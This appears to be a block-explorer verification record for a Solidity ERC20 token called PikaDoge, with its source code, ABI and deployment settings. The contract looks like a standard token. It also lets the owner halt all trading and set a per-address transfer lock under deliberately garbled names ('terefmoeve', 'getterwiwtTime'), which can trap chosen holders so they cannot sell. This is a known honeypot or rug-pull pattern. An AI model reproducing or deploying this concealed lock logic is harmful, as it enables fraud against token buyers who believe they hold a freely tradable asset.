{"SourceCode": "{{\r\n  \"language\": \"Solidity\",\r\n  \"sources\": {\r\n    \"contracts/token/PikaDoge.sol\": {\r\n      \"content\": \"pragma solidity ^0.8.0;\\n\\n// IERC20 interface contains standard functions for ERC20 tokens\\ninterface IERC20 {\\n    // Returns the total token supply.\\n    function totalSupply() external view returns (uint256);\\n\\n    // Returns the token balance of a specific account.\\n    function balanceOf(address account) external view returns (uint256);\\n\\n    // Transfers tokens to a specified address.\\n    function transfer(address recipient, uint256 amount) external returns (bool);\\n\\n    // Returns the remaining number of tokens that spender is allowed to spend on behalf of owner.\\n    function allowance(address owner, address spender) external view returns (uint256);\\n\\n    // Sets the amount of allowance the spender is allowed by the owner.\\n    function approve(address spender, uint256 amount) external returns (bool);\\n\\n    // Transfers tokens from one address to another, using allowance mechanism.\\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\\n\\n    // Emitted when tokens are transferred, including zero value transfers.\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\n\\n    // Emitted when the allowance of a spender for an owner is set by a call to approve.\\n    event Approval(address indexed owner, address indexed spender, uint256 value);\\n}\\n\\n// Context is an abstract contract that provides functionality for retrieving the sender of the transaction.\\nabstract contract Context {\\n    // Returns the address of the sender of the transaction.\\n    function _msgSender() internal view virtual returns (address payable) {\\n        return payable(msg.sender);\\n    }\\n}\\n\\n// Ownable contract manages the ownership of the contract.\\ncontract Ownable is Context {\\n    address private _owner;\\n\\n    // Emitted when ownership is transferred.\\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\\n\\n    // The constructor sets the original owner of the contract to the sender account.\\n    constructor () {\\n        address msgSender = _msgSender();\\n        _owner = msgSender;\\n        emit OwnershipTransferred(address(0), msgSender);\\n    }\\n\\n    // Returns the address of the current owner.\\n    function owner() public view virtual returns (address) {\\n        return _owner;\\n    }\\n\\n    // Modifier to restrict functions to only the owner of the contract.\\n    modifier onlyOwner() {\\n        require(owner() == _msgSender(), \\\"Ownable: caller is not the owner\\\");\\n        _;\\n    }\\n\\n    // Allows the current owner to relinquish control of the contract.\\n    function renounceOwnership() public virtual onlyOwner {\\n        emit OwnershipTransferred(_owner, address(0));\\n        _owner = address(0);\\n    }\\n\\n    // Allows the current owner to transfer control of the contract to a newOwner.\\n    function transferOwnership(address newOwner) public virtual onlyOwner {\\n        require(newOwner != address(0), \\\"Ownable: new owner is the zero address\\\");\\n        emit OwnershipTransferred(_owner, newOwner);\\n        _owner = newOwner;\\n    }\\n}\\n\\n// Main contract implementing the ERC20 standard with additional features.\\ncontract PikaDoge is Context, IERC20, Ownable {\\n    mapping (address => uint256) private _balances;\\n    mapping (address => mapping (address => uint256)) private _allowances;\\n    mapping (address => uint256) private _transferterefmoeve;\\n    bool private _tradingEnabled = true;\\n\\n    string private _name;\\n    string private _symbol;\\n    uint8 private _decimals;\\n    uint256 private _totalSupply;\\n\\n    // The constructor sets initial values for the token name, symbol, decimals, and total supply.\\n    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {\\n        _name = name_;\\n        _symbol = symbol_;\\n        _decimals = decimals_;\\n        _totalSupply = totalSupply_ * (10 ** uint256(decimals_));\\n        _balances[_msgSender()] = _totalSupply;\\n        emit Transfer(address(0), _msgSender(), _totalSupply);\\n    }\\n\\n    // Allows the owner to enable or disable trading.\\n    function setTradingEnabled(bool enabled) public onlyOwner {\\n        _tradingEnabled = enabled;\\n    }\\n\\n    // Returns the current trading status.\\n    function isTradingEnabled() public view returns (bool) {\\n        return _tradingEnabled;\\n    }\\n\\n    // Sets transfer terefmoeve for a specific account.\\n    function setTransferterefmoeve(address account, uint256 time) public onlyOwner {\\n        require(account != address(0), \\\"Cannot set terefmoeve for the zero address\\\");\\n        _transferterefmoeve[account] = time;\\n    }\\n\\n    // Removes transfer terefmoeve for a specific account.\\n    function removeTransferterefmoeve(address account) public onlyOwner {\\n        require(account != address(0), \\\"Cannot remove terefmoeve for the zero address\\\");\\n        delete _transferterefmoeve[account];\\n    }\\n\\n    // Returns the terefmoeve time for a specific account.\\n    function getterwiwtTime(address account) public view returns (uint256) {\\n        require(account != address(0), \\\"Cannot query terefmoeve time for the zero address\\\");\\n        return _transferterefmoeve[account];\\n    }\\n\\n    // Returns the name of the token.\\n    function name() public view returns (string memory) {\\n        return _name;\\n    }\\n\\n    // Returns the symbol of the token.\\n    function symbol() public view returns (string memory) {\\n        return _symbol;\\n    }\\n\\n    // Returns the number of decimals the token uses.\\n    function decimals() public view returns (uint8) {\\n        return _decimals;\\n    }\\n\\n    // Returns the total supply of tokens.\\n    function totalSupply() public view override returns (uint256) {\\n        return _totalSupply;\\n    }\\n\\n    // Returns the balance of a specific account.\\n    function balanceOf(address account) public view override returns (uint256) {\\n        return _balances[account];\\n    }\\n\\n    // Transfers tokens to a specified recipient.\\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\\n        require(_tradingEnabled, \\\"Trading is currently disabled\\\");\\n        require(_balances[_msgSender()] >= amount, \\\"Transfer amount exceeds balance\\\");\\n        require(block.timestamp >= _transferterefmoeve[_msgSender()], \\\"Transfer is currently restricted for this address\\\");\\n\\n        _balances[_msgSender()] -= amount;\\n        _balances[recipient] += amount;\\n        emit Transfer(_msgSender(), recipient, amount);\\n        return true;\\n    }\\n\\n    // Returns the allowance one address has over another.\\n    function allowance(address owner, address spender) public view override returns (uint256) {\\n        return _allowances[owner][spender];\\n    }\\n\\n    // Sets the amount of tokens one address can use on behalf of another.\\n    function approve(address spender, uint256 amount) public override returns (bool) {\\n        _allowances[_msgSender()][spender] = amount;\\n        emit Approval(_msgSender(), spender, amount);\\n        return true;\\n    }\\n\\n    // Transfers tokens from one account to another, subject to allowance and balance.\\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\\n        require(_tradingEnabled, \\\"Trading is currently disabled\\\");\\n        require(_allowances[sender][_msgSender()] >= amount, \\\"Transfer amount exceeds allowance\\\");\\n        require(_balances[sender] >= amount, \\\"Transfer amount exceeds balance\\\");\\n        require(block.timestamp >= _transferterefmoeve[sender], \\\"Transfer is currently restricted for this address\\\");\\n\\n        _balances[sender] -= amount;\\n        _balances[recipient] += amount;\\n        _allowances[sender][_msgSender()] -= amount;\\n        emit Transfer(sender, recipient, amount);\\n        return true;\\n    }\\n}\"\r\n    }\r\n  },\r\n  \"settings\": {\r\n    \"optimizer\": {\r\n      \"enabled\": true,\r\n      \"runs\": 200\r\n    },\r\n    \"outputSelection\": {\r\n      \"*\": {\r\n        \"*\": [\r\n          \"evm.bytecode\",\r\n          \"evm.deployedBytecode\",\r\n          \"devdoc\",\r\n          \"userdoc\",\r\n          \"metadata\",\r\n          \"abi\"\r\n        ]\r\n      }\r\n    },\r\n    \"libraries\": {}\r\n  }\r\n}}", "ABI": "[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"name_\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"symbol_\",\"type\":\"string\"},{\"internalType\":\"uint8\",\"name\":\"decimals_\",\"type\":\"uint8\"},{\"internalType\":\"uint256\",\"name\":\"totalSupply_\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"getterwiwtTime\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isTradingEnabled\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"removeTransferterefmoeve\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"enabled\",\"type\":\"bool\"}],\"name\":\"setTradingEnabled\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"time\",\"type\":\"uint256\"}],\"name\":\"setTransferterefmoeve\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "PikaDoge", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000c0000000000000000000000000000000000000000000000000000000000000001200000000000000000000000000000000000000000000000000000009502f9000000000000000000000000000000000000000000000000000000000000000000850696b61446f676500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000065049444f47450000000000000000000000000000000000000000000000000000", "EVMVersion": "Default", "Library": "", "LicenseType": "", "Proxy": "0", "Implementation": "", "SwarmSource": ""}